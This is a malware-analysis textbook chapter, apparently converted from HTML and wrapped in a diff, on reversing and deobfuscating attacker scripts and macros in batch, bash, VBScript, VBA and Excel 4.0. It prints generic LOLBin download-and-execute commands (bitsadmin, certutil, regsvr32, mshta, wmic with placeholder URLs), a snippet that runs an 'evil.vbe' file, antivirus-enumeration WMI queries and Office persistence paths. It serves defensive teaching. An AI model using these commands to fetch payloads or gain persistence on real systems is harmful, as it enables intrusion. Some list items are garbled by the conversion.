@@ -1,0 +1,548 @@
+<html><head></head><body>
+		<div><h1 id="_idParaDest-320" class="chapter-number"><a id="_idTextAnchor1106"/>10</h1>
+			<h1 id="_idParaDest-321"><a id="_idTextAnchor1107"/>Scripts and Macros – Reversing, Deobfuscation, and Debugging</h1>
+			<p>Writing malware nowadays is a business, and, like any business, it aims to be as profitable as possible by reducing development and operational costs. Another strong advantage is being able to quickly adapt to changing requirements and the environment. Therefore, as modern systems become more and more diverse and low-level malware has to be more specific to its task, for basic operations, such as actual payload delivery, attackers tend to choose approaches that work on multiple platforms and require a minimum amount of effort to develop and upgrade. As a result, it is no surprise that scripting languages have become increasingly popular among attackers as many of them satisfy both of these criteria.</p>
+			<p>In addition to this, the traditional attacker requirements are still valid, such as being as stealthy as possible to successfully achieve malicious goals. If the script interpreter is already available on the target system, then the code will be of a relatively small size. Another reason for this anti-detection is that many traditional antivirus engines support binary and string signatures quite well, but to properly detect obfuscated code scripts, a syntax parser or emulator is required, and this might be costly for the antivirus company to develop and support. All of this makes scripts a perfect choice for first-stage modules.</p>
+			<p>In this chapter, we will cover the following topics: </p>
+			<p>Classic shell script languages</p>
+			<ul>
+				<li>VBScript explained</li>
+				<li>VBA and Excel 4.0 (XLM) macros and more</li>
+				<li>The power of PowerShell</li>
+				<li>Handling JavaScript<a id="_idTextAnchor1108"/></li>
+				<li>Behind C&amp;C – even malware has its own backend <a id="_idTextAnchor1109"/></li>
+				<li>Other script languages</li>
+			</ul>
+			<h1 id="_idParaDest-322"><a id="_idTextAnchor1110"/>Classic shell script languages</h1>
+			<p>All modern operating systems support<a id="_idIndexMarker1480"/> a command language of some kind, which is generally available through the shell. Their functionality varies from system to system. Some command languages might be powerful enough to be used as full-fledged script languages, while others support only the minimal syntax that is required to interact with the machine. In this chapter, we will cover the two most common examples: bash scripting<a id="_idTextAnchor1111"/> for Unix and Linux and batch files for the Windows platform.<a id="_idTextAnchor1112"/></p>
+			<h2 id="_idParaDest-323"><a id="_idTextAnchor1113"/>Windows batch scripting</h2>
+			<p>The Windows batch scripting<a id="_idIndexMarker1481"/> language was created<a id="_idIndexMarker1482"/> mainly to facilitate certain administrative tasks and not to completely replace other full-fledged alternatives. While it supports certain programming concepts, such as functions and loops, some quite basic operations, such as string manipulations, might be less obvious to implement compared to many other programming languages. The code can be executed directly from the <code>cmd.exe</code> console interface or by creating a file with the <code>.cmd</code> or <code>.bat</code> extensions. Note that the commands are case insensitive.</p>
+			<p>The list of supported commands remains quite limited, even today. All commands<a id="_idIndexMarker1483"/> can be split into two groups, as follows:</p>
+			<ul>
+				<li><code>call</code>: This command <a id="_idIndexMarker1486"/>executes functionality from the current batch file or another batch file, or executes a program</li><li><code>start</code>: This command executes a program or opens a file according to its extension</li><li><code>cd</code>: This command changes the current directory</li><li><code>dir</code>: This command lists filesystem objects</li><li><code>copy</code>: This command copies filesystem objects to a new location</li><li><code>move</code>: This command moves filesystem objects to another location</li><li><code>del</code>/<code>erase</code>: These commands delete existing files (not directories)</li><li><code>rd</code>/<code>rmdir</code>: These commands delete directories (not files) </li><li><code>ren</code>/<code>rename</code>: These commands change the names of the filesystem objects</li></ul></li>
+				<li><code>at</code>: This schedules a program to execute at a certain time.</li><li><code>attrib</code>: This displays or changes the filesystem object attributes; for example, the <code>system</code>, <code>read-only</code>, or <code>hidden</code> attributes.</li><li><code>cacls</code>: This<a id="_idIndexMarker1488"/> displays or changes the <code>find</code>: This searches for particular filesystem objects; for example, by filename, by path, or by extension.</li><li><code>format</code>: This formats a disk potentially overwriting the previous content.</li><li><code>ipconfig</code>: This displays and renews the network configuration for the local machine.</li><li><code>net</code>: This is a multifunctional tool that supports various network operations, including user (<code>net user</code>) and remote resource (<code>net use</code>/<code>net share</code>) administration, service management (<code>net start</code>/<code>net stop</code>), and more.</li><li><code>ping</code>: This tool checks<a id="_idIndexMarker1489"/> the connectivity to remote<a id="_idIndexMarker1490"/> resources by using ICMP packets. It can also be used to establish a subvert network channel and exfiltrate data.</li><li><code>reg</code>: This performs various registry-related operations, such as <code>reg query</code>, <code>reg add</code>, <code>reg delete</code>, and so on.</li><li><code>robocopy</code>/<code>xcopy</code>: These tools copy filesystem objects to another location.</li><li><code>rundll32</code>: This loads the DLL; here, exports by name and by ordinals are both supported.</li><li><code>sc</code>: This communicates with Service Control Manager and manages Windows services, including creating, stopping, and changing operations.</li><li><code>schtasks</code>: This is a more powerful version of the <code>at</code> tool; it works by scheduling programs to start at a particular time. This is essentially a console alternative to Windows Task Scheduler, and it supports local and remote<a id="_idTextAnchor1114"/> machines.</li><li><code>shutdown</code>: This restarts or shuts down the local or remote machine.</li><li><code>taskkill</code>: This terminates processes by either name or PID; additionally, it supports both local and remote machines. </li><li><code>tasklist</code>: This displays a list of currently running processes; additionally, it supports both local and remote machines.</li></ul></li>
+			</ul>
+			<p>Historically, no standard tools were provided to send HTTP requests (now <code>curl</code> has become available on modern versions of Windows) or to compress files. From the attacker’s perspective, this means that to implement more or less basic malware functionality, such as downloading, decrypting, and executing additional payloads, they must write extra code. Only later did system tools such as <code>bitsadmin</code> and <code>certutil</code> become commonly misused by attackers<a id="_idIndexMarker1491"/> to download and decode<a id="_idIndexMarker1492"/> the payloads. Here are some examples of how they were used:</p>
+			<ul>
+				<li><code>bitsadmin /transfer &lt;any_name&gt; /download /priority normal &lt;url&gt; &lt;dest&gt;</code></li>
+				<li><code>certutil -urlcache -split -f &lt;url&gt; &lt;dest&gt;</code></li>
+				<li><code>certutil -decode &lt;src&gt; &lt;dest&gt;</code></li>
+			</ul>
+			<p>In addition, there are a few lesser-known ways that Windows malware can access the remote payload using standard console commands, as follows:</p>
+			<ul>
+				<li><code>regsvr32 /s /n /u /i:&lt;url_to_sct&gt; scrobj.dll</code></li>
+				<li><code>mshta &lt;url_to_hta&gt;</code></li>
+				<li><code>wmic os get /FORMAT:&lt;url_to_xsl&gt;</code></li>
+			</ul>
+			<p>Finally, some standard tools such as <code>wmic</code> natively support remote machines, so it is possible to execute certain commands on another victim’s machine if there are available credentials without the extra tools required.</p>
+			<p>More non-standard<a id="_idIndexMarker1493"/> security-related applications for standard tools can be found on the <strong class="bold">LOLBAS</strong> project page: <a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a>. </p>
+			<p>The most common<a id="_idIndexMarker1494"/> obfuscation patterns for batch files<a id="_idIndexMarker1495"/> are as follows:</p>
+			<ul>
+				<li>Building commands by taking substrings from long blocks.</li>
+				<li>Using excessive variable replacements; here, many variables are either not defined or are defined somewhere far from their place of use.</li>
+				<li>Using long variable names<a id="_idIndexMarker1496"/> of random uppercase and lowercase<a id="_idIndexMarker1497"/> letters.</li>
+				<li>Adding multiple meaningless symbols such as pairs of double quotes or caret escape characters (<code>^</code>). An example can be seen in the followi<a id="_idTextAnchor1115"/>ng screenshot:</li>
+			</ul>
+			<div><div><img src="img/Figure_10.1_B18500.jpg" alt="Figure 10.1 – An example of batch script obfuscation using escape symbols&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.1 – An example of batch script obfuscation using escape symbols</p>
+			<ul>
+				<li>Mixing uppercase and lowercase letters in general (the Windows console is case insensitive unless the case makes a difference; for example, in base64 encoding). Here is an example:</li>
+			</ul>
+			<div><div><img src="img/Figure_10.2_B18500.jpg" alt="Figure 10.2 – An example of batch script obfuscation using non-existing variables&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.2 – An example of batch script obfuscation using non-existing variables</p>
+			<p>The first and second<a id="_idIndexMarker1498"/> cases can be handled by just printing the results<a id="_idIndexMarker1499"/> of these operations using the <code>echo</code> command. The third and fourth cases can easily be handled by basic replacement operations, while the fifth case can be handled by just <a id="_idTextAnchor1116"/>making everything lowercase except for things such as bas<a id="_idTextAnchor1117"/>e64-encoded text.</p>
+			<h2 id="_idParaDest-324"><a id="_idTextAnchor1118"/>Bash</h2>
+			<p>Bash is a command-line interface<a id="_idIndexMarker1500"/> that is native to the Unix world. It follows the <em class="italic">one task one tool</em> paradigm, where multiple<a id="_idIndexMarker1501"/> simple programs can be chained together. The shell scripting supports fundamental programming blocks, such as loops, conditional constructs, and functions. In addition to this, it is powered by multiple external tools – most of which can be found on any supported system. Yet, unlike the Windows shell, which has multiple built-in commands, even the most basic functions, such as printing a string, are done by an independent program (in this case, <code>echo</code>). The common file extension for shell scripts is <code>.sh</code>. However, even a file without any extension will be executed properly if the corresponding interpreter is provided in the header; for example, <code>#!/bin/bash</code>. Unlike Windows, here, all commands are case sensitive.</p>
+			<p>There are many other shells in the Linux world, such as <code>sh</code> or <code>zsh</code>, but their syntax <a id="_idTextAnchor1119"/>is largely the same.</p>
+			<p>As most Linux tools provide only a tiny piece of functionality, the full-fledged attack will involve many of them. However, some of them<a id="_idIndexMarker1502"/> are used more often by attackers to achieve their goals, especially<a id="_idIndexMarker1503"/> in mass-infection malware such as <strong class="bold">Mirai</strong>:</p>
+			<ul>
+				<li><code>chmod</code>: This changes permissions; for example, to make a file readable, writable, or executable.</li>
+				<li><code>cd</code>: This changes the current directory.</li>
+				<li><code>cp</code>: This copies filesystem<a id="_idIndexMarker1504"/> objects to another location.</li>
+				<li><code>curl</code>: This network tool is used to transfer data to and from remote servers through multiple supported protocols.</li>
+				<li><code>find</code>: This searches for particular filesystem objects by name and certain attributes.</li>
+				<li><code>grep</code>: This searches for particular strings in a file or files containing particular strings.</li>
+				<li><code>ls</code>: This lists filesystem objects.</li>
+				<li><code>mv</code>: This moves filesystem objects.</li>
+				<li><code>nc</code>: This is a netcat tool that allows the attacker to read from and write to network connections using TCP or UDP. By default, it is not available on some distributions.</li>
+				<li><code>ping</code>: This checks the access to a remote system by sending ICMP packets.</li>
+				<li><code>ps</code>: This lists processes.</li>
+				<li><code>rm</code>: This deletes filesystem objects.</li>
+				<li><code>tar</code>: This compresses and decompresses files using multiple supported protocols.</li>
+				<li><code>tftp</code>: This is a client for <strong class="bold">Trivial File Transfer Protocol</strong> (<strong class="bold">TFTP</strong>); it is a simpler version<a id="_idIndexMarker1505"/> of FTP.</li>
+				<li><code>wget</code>: This downloads files over the HTTP, HTTPS, and FTP protocols:</li>
+			</ul>
+			<div><div><img src="img/Figure_10.3_B18500.jpg" alt="Figure 10.3 – An example of Mirai’s shell script&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.3 – An example o<a id="_idTextAnchor1120"/>f Mirai’s shell script</p>
+			<p>Just like for malware written<a id="_idIndexMarker1506"/> in any other programming language, obfuscation<a id="_idIndexMarker1507"/> can be incorporated here to slow down the reverse engineering process and bypass basic signature detection. Multiple approaches are possible in theory, such as dynamically decoding and executing commands, using crazy variable names, or applying <code>sed</code>/<code>awk</code> string replacements. However, it is worth mentioning that modern IoT malware still doesn’t incorporate any sophisticated tricks. This is mainly because the scripts that are used are quite generic and, often, they can only be <a id="_idTextAnchor1121"/>reliably detected if the corresponding network IOC is known or if the final payload is detected.</p>
+			<p>That’s pretty much everything we need to know about shell scripts. Now, it’s time to talk about full-fledged programming languages. In particular, let’s start with Microsoft <strong class="bold">Visual Basic Scripting Edition</strong> (<a id="_idTextAnchor1122"/><strong class="bold">VBScript</strong>)-based threats.</p>
+			<h1 id="_idParaDest-325"><a id="_idTextAnchor1123"/>VBScript explained</h1>
+			<p>VBScript was the first mainstream programming<a id="_idIndexMarker1508"/> language embedded into Windows OS. It has been actively used by system administrators to automate certain types of tasks without the need to install any third-party software. Available on all modern Microsoft systems, it gradually became a popular choice for malware writers who were looking for a guaranteed way of performing certain actions without any need to recompile the associated code.</p>
+			<p>At the time of writing, Microsoft has decided to switch to PowerShell to handle administrative tasks and has left all future VBScript support to the ASP.NET framework. So far, there are no plans to discontinue it in future Windows releases.</p>
+			<p>The native file extension for VBScript files is <code>.vbs</code>, but it is also possible to encode them into files using a <code>.vbe</code> extension. Additionally, they can be embedded into Windows script files (<code>.wsf</code>) or HTML application (<code>.hta</code>) files. <code>.vbs</code>, <code>.vbe</code>, and <code>.wsf</code> files can be executed either by <code>wscript.exe</code>, which provides the proper GUI, or <code>cscript.exe</code>, which is the console alternative. <code>.hta</code> files can be executed by the <code>mshta.exe</code> tool. VBScript code can also be executed directly from the command line using the <code>mshta vbscr<a id="_idTextAnchor1124"/>ipt:&lt;script_body&gt;</code> syntax.</p>
+			<h2 id="_idParaDest-326"><a id="_idTextAnchor1125"/>Basic syntax</h2>
+			<p>Initially, this technology was intended to be used<a id="_idIndexMarker1509"/> by web developers and this fact drastically affected the syntax. VBScript is modeled on Visual Basic and has similar programming elements, such as conditional structures, loop structures, objects, and embedded functions. Data types are slightly different to work with: for example, all variables in VBScript have the <code>Variant</code> type by default.</p>
+			<p>Most of this high-level <a id="_idIndexMarker1510"/>functionality can be accessed in the corresponding <strong class="bold">Microsoft Component Object Model</strong> (<strong class="bold">COM</strong>) objects. COM is a distributed system for creating and interactin<a id="_idTextAnchor1126"/>g with software components.</p>
+			<p>Here are some COM objects and the corresponding methods and properties that are often misused by attackers:</p>
+			<ul>
+				<li><code>WScript.Shell</code>: This gives access<a id="_idIndexMarker1511"/> to multiple system-wide operations, as follows:<ul><li><code>RegRead</code>/<code>RegDelete</code>/<code>RegWrite</code>: These interact with the Windows registry to check the presence of certain software (such as an antivirus program), tamper with its functionality, delete traces of an activity, or add a module to autorun.</li><li><code>Run</code>: This is used to run an application.</li></ul></li>
+				<li><code>Shell.Application</code>: This allows for more system-related functionality, as follows:<ul><li><code>GetSystemInformation</code>: This acquires various system information, for example, the size of the memory available to identify sandboxes</li><li><code>ServiceStart</code>: This starts a service; for example, one that is associated with a persistent module</li><li><code>ServiceStop</code>: This stops a service; for example, one that belongs to antivirus software</li><li><code>ShellExecute</code>: This runs a script or an application</li></ul></li>
+				<li><code>Scripting.FileSystemObject</code>: This gives access<a id="_idIndexMarker1512"/> to filesystem operations, as follows:<ul><li><code>CreateTextFile</code>/<code>OpenTextFile</code>: This creates or opens a file.</li><li><code>ReadLine</code>/<code>ReadAll</code>: This reads the content of a file; for example, a file that contains some information of interest or another encrypted module.</li><li><code>Write</code>/<code>WriteLine</code>: This writes to the opened file; for example, to overwrite an important file or configuration with other content, or to deliver the next attack stage or an obfuscated payload.</li><li><code>GetFile</code>: This returns a <code>File</code> object that provides access to multiple file properties and several useful methods:<ul><li><code>Copy</code>/<code>Move</code>: This copies or moves files to the specified location</li><li><code>Delete</code>: This deletes the corresponding file</li><li><code>Attributes</code>: This property can be modified t<a id="_idTextAnchor1127"/>o change the file’s attributes</li></ul></li><li><code>CopyFile</code>/<code>Move</code>/<code>MoveFile</code>: This copies or moves a file to another location.</li><li><code>DeleteFile</code>: This deletes<a id="_idIndexMarker1513"/> the requested file.</li></ul></li>
+				<li><code>Outlook.Application</code>: This allows attackers to access Outlook applications to spread malware or spam:<ul><li><code>GetNameSpace</code>: Some namespaces, such as MAPI, will give attackers access to a victim’s contacts</li><li><code>CreateItem</code>: This allows for a new email to be created</li></ul></li>
+				<li><code>Microsoft.XMLHTTP</code>/<code>MSXML2.XMLHTTP</code>: This allows attackers to send HTTP requests<a id="_idIndexMarker1514"/> to interact with web applications:<ul><li><code>Open</code>: This creates a request, such as <code>GET</code> or <code>POST</code></li><li><code>SetRequestHeader</code>: This sets custom headers; for example, for victim statistics, an additional basic authentication layer, or even data exfiltration</li><li><code>Send</code>: This sends the request</li><li><code>GetResponseHeader</code>/<code>GetAllResponseHeaders</code>: These properties check the response for extra information or basic server validation</li><li><code>ResponseText</code>/<code>ResponseBody</code>: These properties provide access to the actual response, such as a command or another malicious module</li></ul></li>
+				<li><code>MSXML2.ServerXMLHTTP</code>: This provides the same functionality as the previously mentioned XMLHTTP, but it is supposed to be used mainly from the server side. It is generally recommended because it handles redirects better. </li>
+				<li><code>WinHttp.WinHttpRequest</code>: Again, this provides similar functionality, but it is implemented in a different library.</li>
+				<li><code>ADODB.Stream</code>: This allows attackers to work with streams of various types, as follows: <ul><li><code>Write</code>: This writes to a stream<a id="_idIndexMarker1515"/> object; this could be from the C&amp;C response, for example</li><li><code>SaveToFile</code>: This writes stream data to a file</li><li><code>Read</code>/<code>ReadText</code>: These can be used t<a id="_idTextAnchor1128"/>o access the base64-encoded value</li></ul></li>
+				<li><code>Microsoft.XMLDOM</code>/<code>MSXML.DOMDocument</code>: These were originally<a id="_idIndexMarker1516"/> designed to work with XML <code>createElement</code>: This can be used together with <code>ADODB.Stream</code> to handle base64 encoding once it is used with the <code>bin.base64</code> <code>DataType</code> value and the <code>NodeTypedValue</code> property</li></ul></li>
+			</ul>
+			<p>So, how can all this information<a id="_idIndexMarker1517"/> be used when we’re performing an analysis? Here is a simple example of code executing another payload:</p>
+			<pre class="source-code">
+Dim Val
+Set Val= Wscript.CreateObject(“WScript.Shell")
+Val.Run “""C:\Temp\evil.vbe"""</pre>
+			<p>As you can see, once the object has been created, its method can be executed straight away. Among native methods, the following can be used to execute expressions and statements:</p>
+			<ul>
+				<li><code>Eval</code>: This evaluates an expression and returns a result value. It interprets the <code>=</code> operator as a comparison rather than an assignment.</li>
+				<li><code>Execute</code>: This executes a group of statements separated by colons or line breaks in the local scope.</li>
+				<li><code>ExecuteGlobal</code>: This is the same as <code>Execute</code>, but for the global scope. It is commonly used by attackers to execute decoded blocks.</li>
+			</ul>
+			<p>Additionally, it is relatively straightforward to work with <strong class="bold">Windows Management Instrumentation</strong> (<strong class="bold">WMI</strong>) using VBScript. WMI is the infrastructure<a id="_idIndexMarker1518"/> for managing data on Windows systems that gives access to various information, such as numerous system properties or a list of installed antivirus products. These are all potentially interesting to attackers.</p>
+			<p>Here are two ways it can be accessed:</p>
+			<ul>
+				<li>With the help of the <code>WbemScripting.SWbemLocator</code> object and its <code>ConnectServer</code> method to access <code>root\cimv2</code>:<pre>Set objLocator = CreateObject("WbemScripting.SWbemLocator") Set objService = objLocator.ConnectServer(".", "root\cimv2") objService.Security_.ImpersonationLevel = 3
+Set Jobs = objService.ExecQuer<a id="_idTextAnchor1129"/>y("SELECT * FROM AntiVirusProduct")</pre></li>
+				<li>Through the <code>winmgmts:</code> moniker:<pre>strComputer = "."
+Set oWMI = GetObject("winmgmts:\\" &amp; "." &amp; "\root\SecurityCenter2")
+Set colItems = oWMI.ExecQuery("SELECT * from AntiVirusProduct")</pre></li>
+			</ul>
+			<p>Now, let’s talk about<a id="_idIndexMarker1519"/> what tools we<a id="_idTextAnchor1130"/> can use to facilitate the analysis.</p>
+			<h2 id="_idParaDest-327"><a id="_idTextAnchor1131"/>Static and dynamic analysis</h2>
+			<p>The once-supported <strong class="bold">Microsoft Script Debugger</strong> has been replaced by <strong class="bold">Microsoft Script Editor</strong> and was distributed<a id="_idIndexMarker1520"/> as part<a id="_idIndexMarker1521"/> of MS Office<a id="_idIndexMarker1522"/> up to its<a id="_idIndexMarker1523"/> 2007 edition; it was later discontinued:</p>
+			<div><div><img src="img/Figure_10.4_B18500.jpg" alt="Figure 10.4 – The Microsoft Script Editor interface&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.4 – The Microsoft Script Editor interface</p>
+			<p>For basic static analysis, a generic text<a id="_idIndexMarker1524"/> editor that supports syntax highlighting<a id="_idIndexMarker1525"/> might be good enough. For dynamic analysis, it is highly recommended to use <strong class="bold">Visual Studio</strong>. Even the free community edition<a id="_idIndexMarker1526"/> provides all the necessary functionality to do this in a very efficient way. To start the debugging process, first, you may wish to just execute the script the following way:</p>
+			<pre>cscript.exe /x evilscript.vbs</pre>
+			<p>However, for most people, it won’t work straight away. Before that, you will need to make sure your IDE is registered as a JIT debugger. To do this for Visual Studio, go to its <strong class="bold">Tools</strong> | <strong class="bold">Options...</strong> | <strong class="bold">Debugging</strong> | <strong class="bold">Just-In-Time</strong> settings and check that the <strong class="bold">Script</strong> tick is set:</p>
+			<div><div><img src="img/Figure_10.5_B18500.jpg" alt="Figure 10.5 – Registering Visual Studio as the JIT debugger for VBScript&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.5 – Registering Visual Studio as the JIT debugger for VBScript</p>
+			<p>After this, executing<a id="_idIndexMarker1527"/> the aforementioned <code>cscript</code> command<a id="_idIndexMarker1528"/> will automatically start suggesting that you use Visual Studio for debugging:</p>
+			<div><div><img src="img/Figure_10.6_B18500.jpg" alt="Figure 10.6 – cscript suggesting Visual Studio for VBScript debugging&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.6 – cscript suggesting Visual Studio for VBScript debugging</p>
+			<p>Once confirmed, everything<a id="_idIndexMarker1529"/> is ready for you to start<a id="_idIndexMarker1530"/> dynamic analysis:</p>
+			<div><div><img src="img/Figure_10.7_B18500.jpg" alt="Figure 10.7 – Debugging the VBScript ﬁle in Visual Studio&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.7 – Debugging the VBScript ﬁle in Visual Studio</p>
+			<p>While it is relatively straightforward<a id="_idIndexMarker1531"/> to encode the <code>.vbs</code> file into <code>.vbe</code> using the <code>EncodeScriptFile</code> method<a id="_idIndexMarker1532"/> provided by the <code>Scripting.Encoder</code> object, there is no native tool to decode the <code>.vbe</code> scripts back to <code>.vbs</code>; otherwise, it would diminish its purpose:</p>
+			<div><div><img src="img/Figure_10.8_B18500.jpg" alt="Figure 10.8 – The original and encoded VBScript ﬁles&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure <a id="_idTextAnchor1132"/>10.8 – The original and encoded VBScript ﬁles</p>
+			<p>However, there are several open source projects available that aim to solve this problem; for example, the <code>decode-vbe.py</code> tool by Didier Stevens.</p>
+			<p>When analyzing the code, it makes sense<a id="_idIndexMarker1533"/> to pay particular attention<a id="_idIndexMarker1534"/> to the following operations:</p>
+			<ul>
+				<li>Filesystem and re<a id="_idTextAnchor1133"/>gistry access </li>
+				<li>Interaction with remote servers </li>
+				<li>Application and script execution</li>
+			</ul>
+			<p>Finally, let’<a id="_idTextAnchor1134"/>s talk about obfuscation and how to handle it.</p>
+			<h2 id="_idParaDest-328"><a id="_idTextAnchor1135"/>Deobfuscation</h2>
+			<p>Quite often, VBS obfuscation<a id="_idIndexMarker1535"/> utilizes pretty basic techniques, such as adding garbage comments or using strings that require character replacement before they can be used. Syntax highlighting appears to be quite useful when analyzing such files.</p>
+			<p>Another common example is building a second-stage payload from the embedded data, such as from an array of integers, and then executing it dynamically, as shown in the following screenshot:</p>
+			<div><div><img src="img/Figure_10.9_B18500.jpg" alt="Figure 10.9 – VBScript malware dynamically builds a second-stage payload&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.9 – VBScript malware dynamically builds a second-stage payload</p>
+			<p>One of the easiest ways<a id="_idIndexMarker1536"/> to convert it into the actual code is to use a great online tool called <strong class="bold">CyberChef</strong>:</p>
+			<div><div><img src="img/Figure_10.10_B18500.jpg" alt="Figure 10.10 – The second stage of the VBScript malware after decoding&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.10 – The second stage of the VBScript malware after decoding</p>
+			<p>Once you have the actual functional<a id="_idIndexMarker1537"/> code, the easiest way to handle it is to search for the functions you are most interested in (the ones that we previously listed) and check their parameters to get information about dropped or exfiltrated files, executed commands, accessed registry keys, and C&amp;C(s) to connect. If the obfuscation layer makes functionality completely obscure, then it is necessary to keep track of variables accumulating at the next stage script. You can iterate through the layers one by one, printing or watching them to get the next block’s functionality until the main block of code becomes readable.</p>
+			<p>Now that we’ve learned about VBScript, let’s talk about a slightly different topic – macros and the threats that rely on them.</p>
+			<h1 id="_idParaDest-329"><a id="_idTextAnchor1136"/>VBA and Excel 4.0 (XLM) macros and more</h1>
+			<p>While many loud malware attacks were related to exploited vulnerabilities, humans remain the weakest link in the defense chain. Social engineering techniques can allow malicious actors to successfully execute their code without creating or buying complicated exploits.</p>
+			<p>Since many organizations now provide cybersecurity training for all newcomers, many people know basic things, such as that it is unsafe to click on links or executable files received by various means from outside of the organization or the group of people that you know. Therefore, the attackers have to invent new ways to trick users, and documents containing malicious macros are a great example of these ongoing efforts.</p>
+			<h2 id="_idParaDest-330"><a id="_idTextAnchor1137"/>VBA macros</h2>
+			<p>MS Office<a id="_idIndexMarker1538"/> macros incorporate the <strong class="bold">Visual Basic for Applications</strong> (<strong class="bold">VBA</strong>) programming language. This is derived from<a id="_idIndexMarker1539"/> Visual Basic 6, which was discontinued a long time ago. VBA survived and was later upgraded to version 7. Normally, the code can only run within a host application, and it is built into mos<a id="_idTextAnchor1138"/>t Microsoft Office applications (even for macOS).</p>
+			<h3>Basic syntax</h3>
+			<p>VBA is a dialect of Visual Basic<a id="_idIndexMarker1540"/> and inherited its syntax. VBScript can be considered as a subset of VBA with a few simplifications, mainly caused by different application models. The same elements need to be paid attention to when analyzing VBA objects:</p>
+			<ul>
+				<li>File and registry operations</li>
+				<li>Network activity</li>
+				<li>Executed commands</li>
+			</ul>
+			<p>The list of COM objects that are of the attacker’s interest is also the same as they are for VBScript. The only difference is that some functionality can be accessed without creating objects; for example, the <code>Shell</code> method.</p>
+			<p>To ensure that it will be executed automatically, malware must use one of the standard function names that will define when it should happen. These names are slightly different for different MS Office products. Here are the most commonly misused ones:</p>
+			<ul>
+				<li><code>AutoOpen</code>/<code>Auto_Open</code></li>
+				<li><code>AutoExit</code>/<code>Auto_Close</code></li>
+				<li><code>AutoExec</code></li>
+				<li><code>Document_Open</code>/<code>Workbook_Open</code></li>
+			</ul>
+			<p>Here is an example of <code>Document_Open</code> being used for this purpose:</p>
+			<div><div><img src="img/Figure_10.11_B18500.jpg" alt="Figure 10.11 – A malicious VBA macro registering the Document_Open routine to achieve execution&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.11 – A malicious VBA macro registering the Document_Open routine to achieve execution</p>
+			<p>Malware can also install dedicated handlers<a id="_idIndexMarker1541"/> so that it can be executed later under some condition, for example, using the <code>Application.OnSheetActivate</code> function.</p>
+			<p>MS Office has its own auto-start directories that are commonly misused by malware to achieve persistence. They do this by placing their code there. Here are the standard ones for different products and versions:</p>
+			<ul>
+				<li><code>%APPDATA%\Microsoft\Word\STARTUP</code></li>
+				<li><code>C:\Program Files\Microsoft Office\[root\]&lt;Office1x&gt;\STARTUP</code></li>
+				<li><code>%APPDATA%\Microsoft\Excel\XLSTART</code></li>
+				<li><code>C:\Program Files\Microsoft Office\[root\]&lt;Office1x&gt;\XLSTART</code></li>
+			</ul>
+			<p>Apart from that, persistence can be achieved by manipulating global macro files:</p>
+			<ul>
+				<li><code>Normal.dot</code>/<code>.dotm</code>: The global macro template for Word (in <code>%APPDATA%\Microsoft\Templates</code>)</li>
+				<li><code>Personal.xls</code>/<code>.xlsb</code>: The global macro<a id="_idIndexMarker1542"/> workbook for Excel (in <code>XLSTART</code>)</li>
+			</ul>
+			<p>Now, let’s talk ab<a id="_idTextAnchor1139"/><a id="_idTextAnchor1140"/>out what tools can help us analyze malicious macros.</p>
+			<h3>Static and dynamic analysis</h3>
+			<p>Unlike VBScript, VBA<a id="_idIndexMarker1543"/> has a native editor in MS<a id="_idIndexMarker1544"/> Office that can be accessed from the <strong class="bold">Developer</strong> tab, which is hidden by default. It can be enabled in <strong class="bold">Word Options</strong> in the <strong class="bold">Customize Ribbon</strong> menu:</p>
+			<div><div><img src="img/Figure_10.12_B18500.jpg" alt="Figure 10.12 – Enabling the VBA macro editor in MS Oﬃce options&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.12 – Enabling the VBA macro editor in MS Oﬃce options</p>
+			<p>It supports debugging the code in this way, making both static and dynamic analysis relatively straightforward.</p>
+			<p>Another tool<a id="_idIndexMarker1545"/> that can extract macros from documents is <code>info</code> command-line<a id="_idIndexMarker1546"/> argument. Apart from this, the previously mentioned tools from the <strong class="bold">oletools</strong> project (especially <strong class="bold">olevba</strong>) and <strong class="bold">oledump</strong> can be used to extract <a id="_idIndexMarker1547"/>and analyze<a id="_idIndexMarker1548"/> VBA macros as well. If the engineer wants to work with p-code instead of source code<a id="_idIndexMarker1549"/> for some reason, the <strong class="bold">pcodedmp</strong> project aims to provide the required functionality.</p>
+			<p>Finally, <strong class="bold">ViperMonkey</strong> can be used to emulate<a id="_idIndexMarker1550"/> some VBA macros and, in this<a id="_idIndexMarker1551"/> way, help handle<a id="_idIndexMarker1552"/> obfuscation.</p>
+			<h2 id="_idParaDest-331"><a id="_idTextAnchor1141"/>Excel 4.0 (XLM) macros</h2>
+			<p>XLM macros, also known<a id="_idIndexMarker1553"/> as formulas, are a 30-year-old feature<a id="_idIndexMarker1554"/> of Microsoft Excel that suddenly gained popularity among attackers recently. An example of it is a <code>SUM</code> function, which is commonly used to automatically calculate a sum of numbers spread across multiple cells. While some of them may be dangerous out of the box, such as <code>EXEC</code>, which allows for arbitrary command execution, in most cases, attackers chain many benign ones to implement malicious functionality.</p>
+			<h3>Basic syntax</h3>
+			<p>Here are some examples of commonly<a id="_idIndexMarker1555"/> misused formulas in the final deobfuscated payload:</p>
+			<ul>
+				<li><code>IF(logical_test, value_if_true, value_if_false)</code></li>
+				<li><code>SEARCH(find_text, within_text, start_num)</code></li>
+				<li><code>CALL(dll_name, api_name, format, arg0, …)</code></li>
+			</ul>
